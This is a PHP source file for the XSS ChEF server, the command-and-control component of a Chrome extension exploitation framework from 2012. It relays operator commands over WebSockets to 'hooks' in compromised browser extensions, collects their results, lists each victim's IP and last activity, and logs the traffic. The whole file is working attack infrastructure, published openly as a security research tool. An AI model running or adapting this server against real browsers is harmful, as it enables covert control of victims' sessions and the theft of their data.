#!/usr/bin/env php
<?php
/*
    XSS ChEF - Chrome Extension Exploitation framework
    Copyright (C) 2012  Krzysztof Kotowicz - http://blog.kotowicz.net

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

require_once __DIR__ . '/php-websocket/server/lib/SplClassLoader.php';
$class_loader = new SplClassLoader('WebSocket', __DIR__ . '/php-websocket/server/lib');
$class_loader->register();

class xssChefServerApplication extends \WebSocket\Application\Application
{
    private $_clients = array();

	protected $resultStorage = array();
	protected $commandStorage = array();
	
	public function onConnect($client)
    {
		$id = $client->getClientId();
        $this->_clients[$id] = $client;		
    }
	protected function _decodeData($data)
	{
		$payload = json_decode($data, true);
		if($payload === null)
		{
			return false;
		}

		if(isset($payload['cmd']) === false)
		{
			return false;
		}
		return $payload;
	}
	
	protected function _encodeData($action, $data)
	{
		if(empty($action))
		{
			return false;
		}
		
		$payload = array(
			'cmd' => $action,
			'payload' => $data
		);
		return json_encode($data);
	}
    

    public function onDisconnect($client)
    {
        $id = $client->getClientId();		
		unset($this->_clients[$id]);     
    }

    public function onData($data, $client)
    {
        try {
            $payload = $this->_decodeData($data);		
            if($payload === false)
            {
                throw new Exception('Invalid data format');
            }
    
            $client->lastActive = date('Y-m-d H:i:s');
            
            $cmdName = $payload['cmd'];
    
            switch ($cmdName) {
                case 'hello-c2c':
                    $client->isHook = false;
                    $client->isC2C = true;
                break;
                case 'set-channel':
                    if (!$client->isC2C) {
                        throw new Exception("Only c2c can set-channel");
                    }
                    $client->channel = $payload['ch'];
                    $this->pushToc2c($client->channel);
                break;
                case 'hello-hook':
                    $client->isHook = true;
                    $client->isC2C = false;
                    $client->channel = $payload['ch'];
                    echo (date('Y-m-d H:i:s') . '  New hook ' . $client->channel . ' from ' . $client->getClientIp() . "\n") ;
                    $this->pushToHook($client->channel); // send pending messages
                    
                    foreach ($this->_clients as $c) {
                        if ($c->isC2C) {
                            $c->send(json_encode(array(array(array(
                                'type' => 'server_msg', 
                                'result' => 'New hook: '. $payload['ch'] . ' - ' . $client->getClientIp(),
                            )))));
                        }
                    };
                break;
                case 'command': // from c&c to hook
                    if (!$client->isC2C) {
                       throw new Exception("Not authorized to send commands");
                    }
                    if (!$client->channel) {
                        throw new Exception("No channel set in connection (command)");
                    }
                    if (!$this->commandStorage[$client->channel]) {
                        $this->commandStorage[$client->channel] = array();
                    }
                    $this->logHookCommand($client->channel, $payload['p']);
                    $this->commandStorage[$client->channel][] = $payload['p'];
                    $this->pushToHook($client->channel);
                break;
                case 'post': // from hook back to c&c 
                    if (!$client->channel) {
                        throw new Exception("No channel set in connection (post)");
                    }
                    
                    if (empty($this->resultStorage[$client->channel])) {
                        $this->resultStorage[$client->channel] = array();
                    }
                    $this->logHookResponse($client->channel, $payload['p']);
                    $this->resultStorage[$client->channel][] = $payload['p'];
                    $this->pushToc2c($client->channel);
                break;
                case 'delete':
                    if ($client->isC2C) {
                        $this->resultStorage = array();
                        $this->commandStorage = array();
                    }
                break;
                case 'list':
                    if ($client->isC2C) {
                        $hooks = array();
                        foreach ($this->_clients as $c) {
                            if ($c->isHook) {
                                $hooks[] = array(
                                    "ch"=> $c->channel,
                                    "ip"=> $c->getClientIp(),
                                    "lastActive" => $c->lastActive,
                                );
                            }
                        };
                        $client->send(json_encode(array(array(array("type" => 'list', "result"=> $hooks)))));
                    }
                break;
                default:
                    throw new Exception('Unknown command ' . $payload['cmd']);
            }
        } catch (Exception $e) {
            echo $e->getMessage();
        }
    }   
    
    protected function logHookResponse($channel, $payloads) {
        foreach ($payloads as $payload) {
            if (!$payload['type'])
                return;
            
            switch ($payload['type']) {
                default:
                    $this->logPayload($channel, "R", json_encode($payload));
                break;
            }
        }
    }
        
    protected function logPayload($channel, $type, $data) {
        file_put_contents('php://stderr', date('Y-m-d H:i:s') . "\t" . $channel . "\t" . $type . "\t" . $data . "\n");
    }
   
    protected function logHookCommand($channel, $payload) {
        $this->logPayload($channel, "C", json_encode($payload));
    }

    protected function push($channel, $flagName, &$container) {
        foreach ($this->_clients as $c) {
            if ($c->$flagName && $c->channel == $channel) {
               if (!empty($container[$channel])) {
                    $c->send(json_encode($container[$channel]));
                    unset($container[$channel]);
                    return;
               }
               
            }
        }
    }
    
    protected function pushToc2c($channel) {
        return $this->push($channel, 'isC2C', $this->resultStorage);
    }
    
    protected function pushToHook($channel) {
        return $this->push($channel, 'isHook', $this->commandStorage);
    }
}
echo <<<EOF
XSS ChEF server
by Krzysztof Kotowicz - kkotowicz at gmail dot com

Usage: php server.php [port=8080] [host=127.0.0.1]
Communication is logged to stderr, use php server.php [port] 2>log.txt

EOF;

$port = (!empty($argv[1]) ? (int) $argv[1] : 8080);
$ip = (!empty($argv[2]) ? $argv[2] : '127.0.0.1');
$server = new \WebSocket\Server($ip, $port, false);

echo (date('Y-m-d H:i:s') . ' ChEF server is listening on ' . $ip . ':' . $port . "\n");

$server->setCheckOrigin(false);
$server->registerApplication('chef', xssChefServerApplication::getInstance());
$server->run();
